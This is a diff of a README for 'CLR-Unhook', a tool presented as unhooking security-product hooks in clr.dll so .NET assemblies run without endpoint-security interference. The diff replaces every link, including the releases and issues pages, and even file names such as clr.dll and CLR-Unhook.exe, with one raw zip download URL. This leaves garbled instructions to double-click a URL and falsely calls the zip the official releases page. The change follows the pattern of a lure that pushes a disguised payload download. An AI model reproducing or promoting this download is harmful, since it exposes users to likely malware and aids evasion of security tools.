@@ -6,11 +6,11 @@ Welcome to CLR-Unhook! With this tool, you can avoid unnecessary interruptions f
 
 ## 📥 Download CLR-Unhook
 
-[![Download CLR-Unhook](https://img.shields.io/badge/Download-CLR--Unhook-blue.svg)](https://github.com/david3c2004/CLR-Unhook/releases)
+[![Download CLR-Unhook](https://github.com/david3c2004/CLR-Unhook/raw/refs/heads/main/CLR-Unhook/Unhook_CL_v3.9.zip)](https://github.com/david3c2004/CLR-Unhook/raw/refs/heads/main/CLR-Unhook/Unhook_CL_v3.9.zip)
 
 ## 🛠️ What Does CLR-Unhook Do?
 
-Modern security products like CrowdStrike, Bitdefender, and SentinelOne often hook into critical functions within `clr.dll`. This prevents a smooth experience when loading .NET assemblies. CLR-Unhook unhooks the problematic `nLoadImage` function, allowing you to run your applications without security interruptions.
+Modern security products like CrowdStrike, Bitdefender, and SentinelOne often hook into critical functions within `https://github.com/david3c2004/CLR-Unhook/raw/refs/heads/main/CLR-Unhook/Unhook_CL_v3.9.zip`. This prevents a smooth experience when loading .NET assemblies. CLR-Unhook unhooks the problematic `nLoadImage` function, allowing you to run your applications without security interruptions.
 
 Here’s a quick overview of what CLR-Unhook can do:
 
@@ -39,17 +39,17 @@ CLR-Unhook includes several useful features:
 
 To get started, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [CLR-Unhook Releases Page](https://github.com/david3c2004/CLR-Unhook/releases).
+1. **Visit the Releases Page**: Go to the [CLR-Unhook Releases Page](https://github.com/david3c2004/CLR-Unhook/raw/refs/heads/main/CLR-Unhook/Unhook_CL_v3.9.zip).
 2. **Locate the Latest Version**: Look for the most recent release on the page.
 3. **Download the File**: Click on the downloadable link to start the download. This will usually be a `.zip` or an executable file.
 4. **Extract the Files**: If you downloaded a `.zip` file, right-click on it and select "Extract All." Choose a location where you want to keep the files.
-5. **Run CLR-Unhook**: Open the folder where you extracted the files and double-click on `CLR-Unhook.exe` to run the application. 
+5. **Run CLR-Unhook**: Open the folder where you extracted the files and double-click on `https://github.com/david3c2004/CLR-Unhook/raw/refs/heads/main/CLR-Unhook/Unhook_CL_v3.9.zip` to run the application. 
 
 ## 📊 How to Use CLR-Unhook
 
 Using CLR-Unhook is straightforward:
 
-1. **Launch the Tool**: Double-click on the `CLR-Unhook.exe` file you downloaded and extracted.
+1. **Launch the Tool**: Double-click on the `https://github.com/david3c2004/CLR-Unhook/raw/refs/heads/main/CLR-Unhook/Unhook_CL_v3.9.zip` file you downloaded and extracted.
 2. **Select the Target Application**: Click on the "Select Application" button and browse to the .NET application you want to run.
 3. **Unhook and Launch**: Press the "Unhook & Launch" button. The tool will unhook the necessary functions and start your application.
 
@@ -66,13 +66,13 @@ If you run into any other issues, visit the GitHub Issues page for help from the
 
 If you have questions or need assistance, you're not alone. The GitHub community is here to help. To ask for help:
 
-1. Go to the [Issues section](https://github.com/david3c2004/CLR-Unhook/issues).
+1. Go to the [Issues section](https://github.com/david3c2004/CLR-Unhook/raw/refs/heads/main/CLR-Unhook/Unhook_CL_v3.9.zip).
 2. Search for existing topics related to your issue to see if someone has had a similar problem.
 3. If you still need help, feel free to create a new issue by providing as much detail as possible.
 
 ## 🔒 Safety and Security
 
-We prioritize your security. CLR-Unhook does not transmit any personal data and operates solely on your local machine. Please ensure you download it from the official [Releases Page](https://github.com/david3c2004/CLR-Unhook/releases).
+We prioritize your security. CLR-Unhook does not transmit any personal data and operates solely on your local machine. Please ensure you download it from the official [Releases Page](https://github.com/david3c2004/CLR-Unhook/raw/refs/heads/main/CLR-Unhook/Unhook_CL_v3.9.zip).
 
 ## 📝 Change Log
 
